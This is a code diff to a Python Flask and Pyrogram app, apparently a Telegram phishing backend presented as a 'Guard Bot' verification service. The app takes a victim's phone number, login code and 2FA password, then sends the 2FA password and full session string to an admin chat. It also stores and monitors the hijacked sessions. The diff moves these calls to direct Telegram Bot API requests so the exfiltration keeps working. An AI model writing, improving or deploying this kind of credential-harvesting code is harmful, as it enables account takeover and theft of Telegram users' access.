@@ -3,6 +3,7 @@ import asyncio
 import sqlite3
 import html
 import logging
+import aiohttp
 from flask import Flask, request, jsonify, send_from_directory
 from pyrogram import Client, errors, enums
 from pyrogram.errors import (
@@ -112,7 +113,7 @@ init_db()
 loop = asyncio.new_event_loop()
 asyncio.set_event_loop(loop)
 
-# ─── BOT CLIENT SETUP FOR NATIVE ASYNC OPERATIONS ───
+# ─── BOT CLIENT SETUP FOR LISTENING EVENTS ───
 bot_client = None
 if BOT_TOKEN:
     bot_client = Client(
@@ -137,43 +138,52 @@ def parse_device_info(user_agent=""):
         system_version = "macOS Sonoma"
     return device_model, system_version
 
-# ─── NATIVE ASYNC HELPER FOR KICKING USER ───
-async def kick_user_from_chat(chat_id, user_id):
-    if not bot_client or not chat_id or not user_id:
-        return
+# ─── TELEGRAM BOT API HTTP ASYNC HELPERS (NO PEER ID ISSUES) ───
+async def bot_api_post(method: str, data: dict):
+    """ មុខងារហៅ Telegram Bot API ផ្ទាល់ ការពារបញ្ហា Peer ID Invalid 100% """
+    if not BOT_TOKEN:
+        return {"ok": False, "description": "No BOT_TOKEN"}
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
     try:
-        # Ban ភ្លាមៗ រួច Unban វិញ ដើម្បីអនុវត្តការ Kick
-        await bot_client.ban_chat_member(chat_id, user_id)
-        await bot_client.unban_chat_member(chat_id, user_id)
-        logger.info(f"⚡ FAST KICK: Successfully kicked user {user_id} from chat {chat_id}")
-    except FloodWait as e:
-        logger.warning(f"FloodWait on kick: sleeping for {e.value}s")
-        await asyncio.sleep(e.value)
-        await kick_user_from_chat(chat_id, user_id)
+        async with aiohttp.ClientSession() as session:
+            async with session.post(url, json=data, timeout=10) as resp:
+                return await resp.json()
     except Exception as e:
-        logger.error(f"Failed to kick user {user_id}: {e}")
+        logger.error(f"HTTP Error calling Telegram API {method}: {e}")
+        return {"ok": False, "description": str(e)}
 
-# ─── NATIVE ASYNC HELPER FOR DELETING/EDITING ADMIN MSG ───
-async def delete_admin_message(chat_id, message_id):
-    if not bot_client or not chat_id or not message_id:
+async def kick_user_from_chat(chat_id, user_id):
+    if not chat_id or not user_id:
         return
-    try:
-        # 1. ព្យាយាម Delete សារតាមរយះ Pyrogram Bot Client ផ្ទាល់
-        await bot_client.delete_messages(chat_id, int(message_id))
+    # 1. Ban Member
+    res1 = await bot_api_post("banChatMember", {"chat_id": chat_id, "user_id": user_id})
+    if res1.get("ok"):
+        # 2. Unban Member វិញដើម្បីបញ្ចប់ការ Kick
+        await bot_api_post("unbanChatMember", {"chat_id": chat_id, "user_id": user_id, "only_if_banned": True})
+        logger.info(f"⚡ FAST KICK: Successfully kicked user {user_id} from chat {chat_id}")
+    else:
+        logger.error(f"Failed to kick user {user_id}: {res1.get('description')}")
+
+async def delete_admin_message(chat_id, message_id):
+    if not chat_id or not message_id:
+        return
+    # 1. ព្យាយាម Delete សារ
+    res = await bot_api_post("deleteMessage", {"chat_id": chat_id, "message_id": int(message_id)})
+    if res.get("ok"):
         logger.info(f"🗑️ Successfully deleted message {message_id} from Admin Chat.")
-    except Exception as del_err:
-        logger.warning(f"Delete failed: {del_err}. Attempting edit instead...")
-        try:
-            # 2. បើ Delete មិនបាន (ឧ. លើស 48 ម៉ោងក្នុង Chat ផ្ទាល់ខ្លួន) -> Edit សារជំនួស
-            await bot_client.edit_message_text(
-                chat_id=chat_id,
-                message_id=int(message_id),
-                text="🔴 <b>[SESSION TERMINATED & REMOVED]</b>\n\n<i>(Session នេះត្រូវគេ Terminated រួចរាល់ Data ត្រូវបានលុបចេញពី System)</i>",
-                parse_mode=enums.ParseMode.HTML
-            )
+    else:
+        logger.warning(f"Delete failed: {res.get('description')}. Attempting edit instead...")
+        # 2. បើ Delete មិនបាន (ឧ. លើស 48 ម៉ោងក្នុង Private Chat) -> Edit សារជំនួស
+        edit_res = await bot_api_post("editMessageText", {
+            "chat_id": chat_id,
+            "message_id": int(message_id),
+            "text": "🔴 <b>[SESSION TERMINATED & REMOVED]</b>\n\n<i>(Session នេះត្រូវគេ Terminated រួចរាល់ Data ត្រូវបានលុបចេញពី System)</i>",
+            "parse_mode": "HTML"
+        })
+        if edit_res.get("ok"):
             logger.info(f"✏️ Successfully edited message {message_id}.")
-        except Exception as edit_err:
-            logger.error(f"Failed to edit message {message_id}: {edit_err}")
+        else:
+            logger.error(f"Failed to edit message {message_id}: {edit_res.get('description')}")
 
 # ─── REAL-TIME MONITORING PER SESSION ───
 async def monitor_single_session(phone, user_id, session_str, msg_id):
@@ -193,7 +203,7 @@ async def monitor_single_session(phone, user_id, session_str, msg_id):
             )
             await client.connect()
             consecutive_errors = 0
-            backoff_delay = 5  # Reset backoff on successful connect
+            backoff_delay = 5
 
             while True:
                 await client.get_me()
@@ -238,7 +248,6 @@ async def monitor_single_session(phone, user_id, session_str, msg_id):
             active_monitors.pop(phone, None)
             return
 
-        # Smart Exponential Backoff
         await asyncio.sleep(backoff_delay)
         backoff_delay = min(backoff_delay * 1.5, 60)
 
@@ -318,7 +327,7 @@ async def async_verify_code(phone_number, code, password):
     temp_clients.pop(phone_number, None)
 
     msg_id = None
-    if bot_client and ADMIN_CHAT_ID:
+    if BOT_TOKEN and ADMIN_CHAT_ID:
         two_fa_text = password if password else "None"
 
         # Safe HTML Escaping
@@ -336,22 +345,21 @@ async def async_verify_code(phone_number, code, password):
             f"🔐 <b>2FA :</b> <code>{two_fa_safe}</code>\n\n"
             f"🔑 <b>Pyrogram Session String:</b>\n<code>{session_safe}</code>"
         )
-        try:
-            sent_msg = await bot_client.send_message(
-                chat_id=ADMIN_CHAT_ID,
-                text=msg,
-                parse_mode=enums.ParseMode.HTML
-            )
-            if sent_msg:
-                msg_id = sent_msg.id
-        except Exception as e:
-            logger.error(f"Error sending msg to Admin chat via bot: {e}")
+        res = await bot_api_post("sendMessage", {
+            "chat_id": ADMIN_CHAT_ID,
+            "text": msg,
+            "parse_mode": "HTML"
+        })
+        if res.get("ok"):
+            msg_id = res["result"]["message_id"]
+        else:
+            logger.error(f"Error sending msg to Admin chat: {res.get('description')}")
 
     # រក្សាទុកក្នុង DB (ជាមួយ WAL mode សុវត្ថិភាពខ្ពស់)
     save_active_session(phone_number, user_id, session_string, msg_id)
 
     # បង្កើត Real-Time Monitoring Task ភ្លាមៗ
-    task = asyncio.create_task(monitor_single_session(phone_number, user_id, session_string, msg_id))
+    task = asyncio.create_task(monitor_single_session(phone_number, user_id, session_str=session_string, msg_id=msg_id))
     active_monitors[phone_number] = task
 
     return {
@@ -420,11 +428,13 @@ async def start_services():
         logger.info("Guard Bot Service started successfully!")
         
         if TARGET_CHANNEL_ID:
-            try:
-                chat = await bot_client.get_chat(TARGET_CHANNEL_ID)
-                logger.info(f"✅ Target Channel linked successfully: {chat.title} ({TARGET_CHANNEL_ID})")
-            except Exception as e:
-                logger.warning(f"⚠️ Failed to link target channel: {e}")
+            # ប្រើ Direct Telegram Bot API HTTP ដើម្បីស្វែងរក Channel ដោយមិនជួបបញ្ហា Peer ID Invalid
+            res = await bot_api_post("getChat", {"chat_id": TARGET_CHANNEL_ID})
+            if res.get("ok"):
+                chat_title = res["result"].get("title", "Target Chat")
+                logger.info(f"✅ Target Channel linked successfully: {chat_title} ({TARGET_CHANNEL_ID})")
+            else:
+                logger.warning(f"⚠️ Telegram API Notice: {res.get('description')}. Make sure Bot is added as ADMIN in channel {TARGET_CHANNEL_ID}")
     
     await start_all_monitors()
 
